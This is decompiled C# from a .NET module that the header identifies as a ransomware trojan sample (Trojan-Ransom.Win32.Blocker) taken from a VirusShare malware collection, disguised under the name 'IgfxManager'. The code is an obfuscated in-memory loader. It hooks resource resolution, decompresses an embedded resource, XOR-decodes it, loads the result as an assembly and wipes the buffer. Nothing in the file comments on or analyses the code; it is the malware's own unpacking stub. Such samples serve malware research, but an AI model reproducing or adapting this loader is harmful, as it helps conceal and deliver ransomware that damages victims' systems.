// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: IgfxManager, Version=0.0.0.0, Culture=neutral, PublicKeyToken=80b8495c3b279c77
// MVID: 3A37F297-AC2C-4797-B496-21D6D30C76CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan-Ransom.Win32.Blocker.jlzn-0dbe907ef98d74fe92cdac8bb6a0f4a4465c6f987585f04ce9aa8e094df31b85.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;

internal class \u003CModule\u003E
{
  static Assembly 쬄\uFFFD杞賿ꩲΦ㤑氠;

  static \u003CModule\u003E() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.\u2706\uFFFD䋆Ɋ瑨御締깝);

  internal static Assembly \u2706\uFFFD䋆Ɋ瑨御締깝(object sender, ResolveEventArgs args)
  {
    if ((object) \u003CModule\u003E.쬄\uFFFD杞賿ꩲΦ㤑氠 == null)
    {
      switch (-~(-2 - -~(~6 - (2 - 5))) - (4 ^ 6))
      {
        default:
          using (BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("笀\uE8D5瘰\uE68E쪽貸㯷\uE490"), CompressionMode.Decompress)))
          {
            byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
            int num1 = 3;
            int index;
            byte num2;
            while (true)
            {
              switch (-~(num1 - -~(~6 - (2 - 5))) - (4 ^ 6))
              {
                case 2:
                  index = 0;
                  num1 = -2;
                  continue;
                case 3:
                  goto label_9;
                case 4:
                  ++index;
                  num1 = -1;
                  continue;
                case 5:
                  num2 = (byte) 59;
                  num1 = 0;
                  continue;
                default:
                  if (index < numArray.Length)
                  {
                    numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num2);
                    num2 = (byte) ((int) num2 * 0 % 256);
                    num1 = 2;
                    continue;
                  }
                  \u003CModule\u003E.쬄\uFFFD杞賿ꩲΦ㤑氠 = Assembly.Load(numArray);
                  num1 = 1;
                  continue;
              }
            }
label_9:
            Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
            break;
          }
      }
    }
    return Array.IndexOf<string>(\u003CModule\u003E.쬄\uFFFD杞賿ꩲΦ㤑氠.GetManifestResourceNames(), args.Name) == -1 ? (Assembly) null : \u003CModule\u003E.쬄\uFFFD杞賿ꩲΦ㤑氠;
  }
}
